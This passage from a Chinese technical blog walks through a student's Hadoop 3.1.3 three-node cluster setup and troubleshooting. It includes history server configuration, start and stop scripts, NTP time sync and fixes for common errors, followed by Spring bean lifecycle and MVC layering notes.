<h5 id="执行wordcount程序"><a href="#执行wordcount程序" class="headerlink" title="执行wordcount程序"></a>执行wordcount程序</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount /input /output</span><br></pre></td></tr></table></figure>

<h3 id="配置历史服务器"><a href="#配置历史服务器" class="headerlink" title="配置历史服务器"></a>配置历史服务器</h3><p>1.配置 mapred-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ cd /opt/module/hadoop-3.1.3/etc/hadoop/</span><br><span class="line">[huang@hadoop102 hadoop]$ vi mapred-site.xml</span><br></pre></td></tr></table></figure>

<p>在该文件中增加如下配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 历史服务器端地址 --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.jobhistory.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:10020<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 历史服务器 web 端地址 --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.jobhistory.webapp.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:19888<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.分发配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ xsync /opt/module/hadoop-3.1.3/etc/</span><br></pre></td></tr></table></figure>

<p>3.在 hadoop102 启动历史服务器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ mapred --daemon start historyserve</span><br><span class="line"><span class="meta"># </span><span class="language-bash">查看是否启动</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ jps</span><br><span class="line">29072 JobHistoryServer</span><br><span class="line">29146 Jps</span><br><span class="line">16923 DataNode</span><br><span class="line">16748 NameNode</span><br><span class="line">17454 NodeManager</span><br></pre></td></tr></table></figure>

<h3 id="配置日志的聚集"><a href="#配置日志的聚集" class="headerlink" title="配置日志的聚集"></a>配置日志的聚集</h3><h3 id="集群启动和停止方式"><a href="#集群启动和停止方式" class="headerlink" title="集群启动和停止方式"></a>集群启动和停止方式</h3><h4 id="各个模块分开启动-x2F-停止（配置ssh是前提）常用"><a href="#各个模块分开启动-x2F-停止（配置ssh是前提）常用" class="headerlink" title="各个模块分开启动&#x2F;停止（配置ssh是前提）常用"></a>各个模块分开启动&#x2F;停止（配置ssh是前提）常用</h4><p>1.整体启动&#x2F;停止HDFS</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">start-dfs.sh/stop-dfs.sh</span><br></pre></td></tr></table></figure>

<p>2.整体启动&#x2F;停止YARN</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">start-yarn.sh/stop-yarn.sh</span><br></pre></td></tr></table></figure>

<h4 id="各个服务逐一启动-x2F-停止"><a href="#各个服务逐一启动-x2F-停止" class="headerlink" title="各个服务逐一启动&#x2F;停止"></a>各个服务逐一启动&#x2F;停止</h4><p>1.分别启动&#x2F;停止HDFS组件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hdfs --daemon start/stop namenode/datanode/secondarynamenode</span><br></pre></td></tr></table></figure>

<p>2.启动&#x2F;停止YARN</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yarn --daemon start/stop resourcemanager/nodemanager</span><br></pre></td></tr></table></figure>

<h3 id="编写Hadoop集群常用脚本"><a href="#编写Hadoop集群常用脚本" class="headerlink" title="编写Hadoop集群常用脚本"></a>编写Hadoop集群常用脚本</h3><h4 id="Hadoop-集群启停脚本-包含-HDFS，Yarn，Historyserver-myhadoop-sh"><a href="#Hadoop-集群启停脚本-包含-HDFS，Yarn，Historyserver-myhadoop-sh" class="headerlink" title="Hadoop 集群启停脚本(包含 HDFS，Yarn，Historyserver):myhadoop.sh"></a>Hadoop 集群启停脚本(包含 HDFS，Yarn，Historyserver):myhadoop.sh</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ cd /home/huang/bin/</span><br><span class="line">[huang@hadoop102 bin]$ vi myhadoop.sh</span><br></pre></td></tr></table></figure>

<p>文件内容如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">if [ $# -lt 1 ]</span><br><span class="line">then</span><br><span class="line">		echo &quot;No Args Input...&quot;</span><br><span class="line">		exit ; </span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">case $1 in </span><br><span class="line">&quot;start&quot;)</span><br><span class="line">	echo &quot; =================== 启动 hadoop 集群 ===================&quot;</span><br><span class="line">	echo &quot; --------------- 启动 hdfs ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/sbin/start-dfs.sh&quot; </span><br><span class="line">	echo &quot; --------------- 启动 yarn ---------------&quot;</span><br><span class="line">	ssh hadoop103 &quot;/opt/module/hadoop-3.1.3/sbin/start-yarn.sh&quot;</span><br><span class="line">	echo &quot; --------------- 启动 historyserver ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/bin/mapred --daemon start historyserver&quot;</span><br><span class="line">;;</span><br><span class="line">&quot;stop&quot;)</span><br><span class="line">	echo &quot; =================== 关闭 hadoop 集群 ===================&quot;</span><br><span class="line">	echo &quot; --------------- 关闭 historyserver ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/bin/mapred --daemon stop historyserver&quot;</span><br><span class="line">	echo &quot; --------------- 关闭 yarn ---------------&quot;</span><br><span class="line">	ssh hadoop103 &quot;/opt/module/hadoop-3.1.3/sbin/stop-yarn.sh&quot; </span><br><span class="line">	echo &quot; --------------- 关闭 hdfs ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/sbin/stop-dfs.sh&quot;</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">   echo &quot;Input Args Error...&quot;</span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">赋予脚本执行权限</span></span><br><span class="line">[huang@hadoop102 bin]$ chmod +x myhadoop.sh </span><br><span class="line"><span class="meta">#</span><span class="language-bash">分发脚本</span></span><br><span class="line">[huang@hadoop102 ~]$ xsync /home/huang/bin/</span><br></pre></td></tr></table></figure>

<h4 id="查看三台服务器Java进程脚本：jpsall"><a href="#查看三台服务器Java进程脚本：jpsall" class="headerlink" title="查看三台服务器Java进程脚本：jpsall"></a>查看三台服务器Java进程脚本：jpsall</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /home/huang/bin/</span><br><span class="line">[huang@hadoop102 bin]$ vi jpsall</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for host in hadoop102 hadoop103 hadoop104 </span><br><span class="line">do</span><br><span class="line">	echo =============== $host ===============</span><br><span class="line">  ssh $host jps</span><br><span class="line">done</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">赋予执行权限</span></span><br><span class="line">[huang@hadoop102 bin]$ chmod +x jpsall</span><br><span class="line"><span class="meta">#</span><span class="language-bash">分发脚本</span></span><br><span class="line">[huang@hadoop102 ~]$ xsync /home/huang/bin/</span><br></pre></td></tr></table></figure>

<h3 id="常用端口号"><a href="#常用端口号" class="headerlink" title="常用端口号"></a>常用端口号</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220049227.png" alt="image-20210628130455175"></p>
<h3 id="集群内时间同步"><a href="#集群内时间同步" class="headerlink" title="集群内时间同步"></a>集群内时间同步</h3><p>如果服务器在公网环境(能连接外网)，可以不采用集群时间同步，因为服务器会定期 和公网时间进行校准;</p>
<p>如果服务器在内网环境，必须要配置集群时间同步，否则时间久了，会产生时间偏差， 导致集群执行任务时间不同步。</p>
<h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><p>找一个机器，作为时间服务器，所有的机器与这台集群时间进行定时的同步，生产环境 根据任务对时间的准确程度要求周期同步。测试环境为了尽快看到效果，采用 1 分钟同步一 次。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220053356.png" alt="截屏2021-06-28 下午1.07.20"></p>
<h4 id="时间服务器配置（必须root用户）"><a href="#时间服务器配置（必须root用户）" class="headerlink" title="时间服务器配置（必须root用户）"></a>时间服务器配置（必须root用户）</h4><p>1.查看所有节点 ntpd 服务状态和开机自启动状态</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ sudo systemctl status ntpd</span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl start ntpd</span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl is-enabled ntpd</span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl status ntpd</span><br></pre></td></tr></table></figure>

<p>2.修改hadoop102的ntp.conf配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ sudo vi /etc/ntp.conf </span><br><span class="line"><span class="meta"># </span><span class="language-bash">Hosts on <span class="built_in">local</span> network are less restricted.</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">restrict 192.168.1.0 mask 255.255.255.0 nomodify notrap</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">授权 10.211.55.0-10.211.55.255 网段上的所有机器可以从这台机器上查询和同步时间</span></span><br><span class="line">restrict 10.211.55.0 mask 255.255.255.0 nomodify notrap</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Use public servers from the pool.ntp.org project.</span> </span><br><span class="line"><span class="meta"># </span><span class="language-bash">Please consider joining the pool (http://www.pool.ntp.org/join.html).</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">集群在局域网中不使用其他互联网上的时间，下面4个都注释掉</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">server 3.centos.pool.ntp.org iburst</span></span><br><span class="line">server 127.127.1.0 #127.127.1.0 不是IP 地址。 它是一种格式，用来引用向服务器提供准确时间的时钟。</span><br><span class="line">fudge 127.127.1.0 stratum 10</span><br><span class="line"></span><br><span class="line">[huang@hadoop102 ~]$ sudo vi /etc/sysconfig/ntpd</span><br><span class="line"><span class="meta">#</span><span class="language-bash">增加内容如下（让硬件时间与系统时间一起同步）</span></span><br><span class="line">SYNC_HWCLOCK=yes</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">启动ntpd</span></span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl start ntpd</span><br><span class="line"><span class="meta">#</span><span class="language-bash">设置开机自启</span></span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl enable ntpd</span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/ntpd.service to /usr/lib/systemd/system/ntpd.service.</span><br></pre></td></tr></table></figure>

<p>3.其他机器配置（必须root用户）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop103 ~]$ sudo systemctl stop ntpd</span><br><span class="line">[huang@hadoop103 ~]$ sudo systemctl disable ntpd</span><br><span class="line"></span><br><span class="line">[huang@hadoop104 ~]$ sudo systemctl stop ntpd</span><br><span class="line">[huang@hadoop104 ~]$ sudo systemctl disable ntpd</span><br><span class="line"></span><br><span class="line">[huang@hadoop104 ~]$ sudo crontab -e</span><br><span class="line"><span class="meta">#</span><span class="language-bash">编写内容如下</span></span><br><span class="line">*/1 * * * * /usr/sbin/ntpdate hadoop102</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[huang@hadoop103 ~]$ sudo crontab -e</span><br><span class="line"><span class="meta">#</span><span class="language-bash">编写内容如下</span></span><br><span class="line">*/1 * * * * /usr/sbin/ntpdate hadoop102</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">任意修改机器时间</span></span><br><span class="line">[huang@hadoop103 ~]$ sudo date -s &quot;2021-9-9 11:11:11&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">一分钟后查看</span></span><br><span class="line">[huang@hadoop103 ~]$ sudo date</span><br></pre></td></tr></table></figure>

<h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><h3 id="使用jpsall查看各个节点的状态"><a href="#使用jpsall查看各个节点的状态" class="headerlink" title="使用jpsall查看各个节点的状态"></a>使用jpsall查看各个节点的状态</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220053357.png" alt="image-20210628134220753"></p>
<p>与集群规划结果一致</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220059915.png" alt="image-20210628012056622"></p>
<h3 id="集群时间同步正常"><a href="#集群时间同步正常" class="headerlink" title="集群时间同步正常"></a>集群时间同步正常</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220102726.png" alt="image-20210628134736319"></p>
<h3 id="NameNode-HTTP-UI查看DataNode情况"><a href="#NameNode-HTTP-UI查看DataNode情况" class="headerlink" title="NameNode HTTP UI查看DataNode情况"></a>NameNode HTTP UI查看DataNode情况</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220100464.png" alt="1"></p>
<h3 id="MapReduce查看执行任务，Active-Nodes为3"><a href="#MapReduce查看执行任务，Active-Nodes为3" class="headerlink" title="MapReduce查看执行任务，Active Nodes为3"></a>MapReduce查看执行任务，Active Nodes为3</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220101234.png" alt="2"></p>
<h3 id="历史服务器查看执行过的任务"><a href="#历史服务器查看执行过的任务" class="headerlink" title="历史服务器查看执行过的任务"></a>历史服务器查看执行过的任务</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220101747.png" alt="3"></p>
<h2 id="四、实验遇到的问题及解决方法"><a href="#四、实验遇到的问题及解决方法" class="headerlink" title="四、实验遇到的问题及解决方法"></a>四、实验遇到的问题及解决方法</h2><p>此部分为实验报告关键部分，详尽叙述实验过程中遇到的问题和解决方法</p>
<h3 id="Error-Could-not-find-or-load-main-class-org-apache-hadoop-mapreduce-v2-app-MRAppMaster"><a href="#Error-Could-not-find-or-load-main-class-org-apache-hadoop-mapreduce-v2-app-MRAppMaster" class="headerlink" title="Error: Could not find or load main class org.apache.hadoop.mapreduce.v2.app.MRAppMaster"></a>Error: Could not find or load main class org.apache.hadoop.mapreduce.v2.app.MRAppMaster</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220102727.png" alt="image-20210628140143997"></p>
<p>解决方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ vi /opt/module/hadoop-3.1.3/etc/hadoop/mapred-site.xml </span><br><span class="line"><span class="meta">#</span><span class="language-bash">在文件中增加以下内容</span></span><br><span class="line">&lt;/property&gt;</span><br><span class="line">        &lt;property&gt;</span><br><span class="line">                &lt;name&gt;yarn.app.mapreduce.am.env&lt;/name&gt;</span><br><span class="line">                &lt;value&gt;HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3&lt;/value&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">        &lt;property&gt;</span><br><span class="line">                &lt;name&gt;mapreduce.map.env&lt;/name&gt;</span><br><span class="line">                &lt;value&gt;HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3&lt;/value&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">        &lt;property&gt;</span><br><span class="line">                &lt;name&gt;mapreduce.reduce.env&lt;/name&gt;</span><br><span class="line">                &lt;value&gt;HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br></pre></td></tr></table></figure>

<h3 id="NameNode-Web服务器无法访问"><a href="#NameNode-Web服务器无法访问" class="headerlink" title="NameNode Web服务器无法访问"></a>NameNode Web服务器无法访问</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220102835.png" alt="4">解决方案：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">关闭防火墙</span></span><br><span class="line">[huang@hadoop102 ~]$ systemctl stop firewalld</span><br><span class="line">[huang@hadoop102 ~]$ systemctl disable firewalld.service</span><br><span class="line"></span><br><span class="line">[huang@hadoop103 ~]$ systemctl stop firewalld</span><br><span class="line">[huang@hadoop103 ~]$ systemctl disable firewalld.service</span><br><span class="line"></span><br><span class="line">[huang@hadoop104 ~]$ systemctl stop firewalld</span><br><span class="line">[huang@hadoop104 ~]$ systemctl disable firewalld.service</span><br></pre></td></tr></table></figure>



<h3 id="Hadoop104-上DateNode和NodeManager没启动"><a href="#Hadoop104-上DateNode和NodeManager没启动" class="headerlink" title="Hadoop104 上DateNode和NodeManager没启动"></a>Hadoop104 上DateNode和NodeManager没启动</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220102728.png" alt="image-20210628141052256"></p>
<p>解决方案：</p>
<p>workers配置错误，重新配置workers</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">该文件中不允许出现空格，结尾也不行</span></span><br><span class="line">[huang@hadoop102 ~]$ vi /opt/module/hadoop-3.1.3/etc/hadoop/workers </span><br><span class="line">hadoop102</span><br><span class="line">hadoop103</span><br><span class="line">hadoop104</span><br><span class="line"></span><br><span class="line">[huang@hadoop102 ~]$ xsync /opt/module/hadoop-3.1.3/etc/ </span><br></pre></td></tr></table></figure>



<h3 id="修改配置后重启服务发现DataNode和NameNode进程只能重启一个"><a href="#修改配置后重启服务发现DataNode和NameNode进程只能重启一个" class="headerlink" title="修改配置后重启服务发现DataNode和NameNode进程只能重启一个"></a>修改配置后重启服务发现DataNode和NameNode进程只能重启一个</h3><p>因为NameNode在format初始化后会生成clusterId（集群ID），DateNode在启动后会生成和NameNode一样的clusterId（集群ID），再次格式化NameNode，生成新的clusterid，与未删除DataNode的clusterid不一致，集群找不到已往数据。</p>
<p>解决方法：</p>
<p>需要重新格式化 NameNode 的话，<strong>一定要先停止所有机器的NameNode 和 DataNode 进程，并且要删除所有机器的 data 和 logs 目录，然后再进行格式化</strong>。</p>
<h3 id="ssh没有配置好，导致使用myhadoop-sh时需要输入密码"><a href="#ssh没有配置好，导致使用myhadoop-sh时需要输入密码" class="headerlink" title="ssh没有配置好，导致使用myhadoop.sh时需要输入密码"></a>ssh没有配置好，导致使用myhadoop.sh时需要输入密码</h3><p>解决方法：用ssh将各个服务器都互相连接一边，如果出现连不上，需要重新配置</p>
<h3 id="ERROR-conf-Configuration-error-parsing-conf-yarn-site-yml"><a href="#ERROR-conf-Configuration-error-parsing-conf-yarn-site-yml" class="headerlink" title="ERROR conf.Configuration: error parsing conf yarn-site.yml"></a>ERROR conf.Configuration: error parsing conf yarn-site.yml</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220102729.png" alt="image-20210628142738471"></p>
<p>解决方法：</p>
<p>yarn-site.yml 中的一个配置项多输了一个空格，删掉即可</p>
<h3 id="通过ssh连接到其他服务器时，自己配置的环境变量会失效，每次都得source-x2F-etc-x2F-profile"><a href="#通过ssh连接到其他服务器时，自己配置的环境变量会失效，每次都得source-x2F-etc-x2F-profile" class="headerlink" title="通过ssh连接到其他服务器时，自己配置的环境变量会失效，每次都得source &#x2F;etc&#x2F;profile"></a>通过ssh连接到其他服务器时，自己配置的环境变量会失效，每次都得source &#x2F;etc&#x2F;profile</h3><p>ssh连接时环境变量无效：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220102730.png" alt="image-20210628195903368"></p>
<p>在hadoop内时环境变量有效：</p>
<p>![截屏2021-06-28 下午8.06.44 (SA20225201-黄名旺-Lab-1.assets&#x2F;截屏2021-06-28 下午8.06.44 (2)-4882079.png)</p>
<p>配置的环境变量的方式：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">配置JDK环境变量</span></span><br><span class="line">[huang@hadoop102 ~]$ sudo vi /etc/profile.d/my_env.sh</span><br><span class="line">export JAVA_HOME=/opt/module/jdk1.8.0_212</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin</span><br></pre></td></tr></table></figure>

<p>问题原因：</p>
<p>SSH 登录默认为非shell登录方式，而非shell登录方式执行的是bashrc脚本初始化环境变量。<br>而shell登录方式则是执行的是profile脚本初始化环境变量。</p>
<p>解决方法：</p>
<p>把在&#x2F;etc&#x2F;profile.d&#x2F;my_env.sh中配置的内容放进 &#x2F;etc&#x2F;bashrc 文件中即可；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ sudo vi /etc/bashrc</span><br><span class="line"><span class="meta">#</span><span class="language-bash">JAVA_HOME</span></span><br><span class="line">export JAVA_HOME=/opt/module/jdk1.8.0_212</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin</span><br><span class="line"><span class="meta">#</span><span class="language-bash">HADOOP_HOME</span></span><br><span class="line">export HADOOP_HOME=/opt/module/hadoop-3.1.3 export PATH=$PATH:$HADOOP_HOME/bin</span><br><span class="line">export PATH=$PATH:$HADOOP_HOME/sbin</span><br><span class="line"></span><br><span class="line">[huang@hadoop102 ~]$ sudo xsync /etc/bashrc</span><br><span class="line">==================== hadoop102 ====================</span><br><span class="line">sending incremental file list</span><br><span class="line"></span><br><span class="line">sent 45 bytes  received 12 bytes  38.00 bytes/sec</span><br><span class="line">total size is 3,058  speedup is 53.65</span><br><span class="line">==================== hadoop103 ====================</span><br><span class="line">sending incremental file list</span><br><span class="line">bashrc</span><br><span class="line"></span><br><span class="line">sent 366 bytes  received 65 bytes  862.00 bytes/sec</span><br><span class="line">total size is 3,058  speedup is 7.10</span><br><span class="line">==================== hadoop104 ====================</span><br><span class="line">sending incremental file list</span><br><span class="line">bashrc</span><br><span class="line"></span><br><span class="line">sent 366 bytes  received 65 bytes  862.00 bytes/sec</span><br><span class="line">total size is 3,058  speedup is 7.10</span><br></pre></td></tr></table></figure>

<p>问题解决：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220102731.png" alt="image-20210628201757923"></p>
]]></content>
      <tags>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>leyou</title>
    <url>/2021/12/21/leyou/leyou/</url>
    <content><![CDATA[<h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><p>Spring提供了一个通用的异常处理器ControllerAdvice，可以非常方便的帮助我们实现统一的异常处理。</p>
<h2 id="Bean的生命周期"><a href="#Bean的生命周期" class="headerlink" title="Bean的生命周期"></a>Bean的生命周期</h2><p><a href="https://xulinjie.blog.csdn.net/article/details/80086950?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-5.control&amp;dist_request_id=1331645.20431.16184486089016157&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-5.control">https://xulinjie.blog.csdn.net/article/details/80086950?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-5.control&amp;dist_request_id=1331645.20431.16184486089016157&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-5.control</a></p>
<p>可以简述为以下九步<br>实例化bean对象(通过构造方法或者工厂方法)<br>设置对象属性(setter等)（依赖注入）<br>如果Bean实现了BeanNameAware接口，工厂调用Bean的setBeanName()方法传递Bean的ID。（和下面的一条均属于检查Aware接口）<br>如果Bean实现了BeanFactoryAware接口，工厂调用setBeanFactory()方法传入工厂自身<br>将Bean实例传递给Bean的前置处理器的postProcessBeforeInitialization(Object bean, String beanname)方法<br>调用Bean的初始化方法<br>将Bean实例传递给Bean的后置处理器的postProcessAfterInitialization(Object bean, String beanname)方法<br>使用Bean<br>容器关闭之前，调用Bean的销毁方法</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">   <span class="comment">&lt;!-- init-method：指定初始化的方法</span></span><br><span class="line"><span class="comment">        destroy-method：指定销毁的方法 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;student&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.linjie.cycle.Student&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;initStudent&quot;</span> <span class="attr">destroy-method</span>=<span class="string">&quot;destroyStudent&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;LINJIE&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>bean的后置处理器，是为了对bean的一个增强</p>
<p>可以在applicationContext.xml中看到配置Bean后置处理器，不需要ID，只需要其全类名，因为IoC容器自动识别一个BeanPostProcessor</p>
<p>在控制台显示结果可以看出,Bean的后置处理器强大之处，可以对Bean实现自己想要做的事情，比如我这里的Demo就是在postProcessAfterInitialization方法中将成员变量name偷偷修改了，最后输出的就是偷偷修改之后的值</p>
</blockquote>
<h2 id="springboot2"><a href="#springboot2" class="headerlink" title="springboot2"></a>springboot2</h2><p>适配器把接口全部实现一遍,然后继承适配器,重写方法,java8新特性有接口默认实现,就可以不需要适配器了</p>
<p>就按MVC模式的开发模式来，我们项目中包含的结构层分别是view，controller，service，dao。</p>
<p>下面介绍一下各层的意义和项目运行流程：</p>
<p>view是前台页面，用户发送请求时从前端的页面开始的，前端get到这个请求后会把请求和顺带参数信息传送到后台，后台接受这个请求找到对应的接口去执行对应的controller里的对应的方法，然后执行，然后controller会调用service层的业务逻辑，service有会去访问dao层来连接数据库。</p>
<p>这是我们后端程序员都熟悉的开发模式，然而不论是刚开始从事程序开发的程序员还是有一定开发经验的程序员，有时候其实都特别搞得清楚controller层和service层之间的关系，会把他们的功能搞模糊，或者说是你虽然明确的知道他们两个的各自分工，但是在实际打开发过程中，就是会把一些代码写杂了，该写在service里的代码段写到controller里去了。</p>
<p>所以，我们为了规范，有必要搞清楚controller中到底是写什么东西来着，</p>
<p>1、这里只接收数据，然后校验数据，校验合法性和准确性，比如说登录的controller，接收到用户名和密码，你要判断长度是否符合要求，密码解密出来。</p>
<p>2、有的必要的情况，创建一个对象，把数据补全，比如他的一些简单的属性，创建时间啊修改时间啊，还有初始值什么的。</p>
<p>3、其他的都不要写在controller里，其他的复杂业务逻辑判断什么的，都放在service里头去。</p>
<p><strong>1.Dao层</strong>：全称Data Access Object。Dao层比较底层，负责与数据库打交道具体到对某个表、某个实体的增删改查<br><strong>2.Service层</strong>：又叫服务层或业务层，封装Dao层的操作，使一个方法对外表现为实现一种功能，例如：网购生成订单时，不仅要插入订单信息记录，还要查询商品库存是否充足，购买是否超过限制等等。<br><strong>3.Controller层</strong>：业务控制层，负责接收数据和请求，并且调用Service层实现这个业务逻辑。</p>
